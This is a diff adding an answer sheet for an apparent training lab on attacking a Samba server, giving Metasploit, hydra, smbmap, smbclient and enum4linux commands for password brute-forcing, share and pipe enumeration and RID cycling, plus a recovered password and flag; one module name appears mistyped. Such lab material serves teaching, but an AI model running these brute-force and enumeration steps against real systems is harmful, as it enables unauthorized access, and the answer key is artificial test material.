@@ -1,0 +1,35 @@
+What is the password of user “jane” required to access share “jane”? Use smb_login metasploit module with password wordlist /usr/share/wordlists/metasploit/unix_passwords.txt
+Ans.
+msfconsole
+use auxiliary/scanner/smb/smb_login
+set rhosts 10.0.1.22
+set pass_file /usr/share/wordlists/metasploit/unix_passwords.txt
+set smbuser jane
+run
+
+What is the password of user “admin” required to access share “admin”? Use hydra with password wordlist: /usr/share/wordlists/rockyou.txt
+Ans. hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.0.1.22 smb
+
+Which share is read only? Use smbmap with credentials obtained in question 2.
+Ans. smbmap -H 10.0.1.22 -u admin -p password1
+
+Is share “jane” browseable? Use credentials obtained from the 1st question.
+Ans. smbclient -U jane -L 10.0.1.22
+
+Fetch the flag from share “admin”
+Ans. 2727069bc058053bd561ce372721c92e
+
+List the named pipes available over SMB on the samba server? Use  pipe_auditor metasploit module with credentials obtained from question 2.
+Ans.
+msfconsole
+use auxiliary/scanner/smb/pip2_auditor
+set rhosts 10.0.1.22
+set smbuser admin
+set smbpass password1
+run 
+
+List sid of Unix users shawn, jane, nancy and admin respectively by performing RID cycling  using enum4Linux with credentials obtained in question 2.
+Ans. enum4linux -r -u "admin" -p "password1" 10.0.1.22
+
+
+
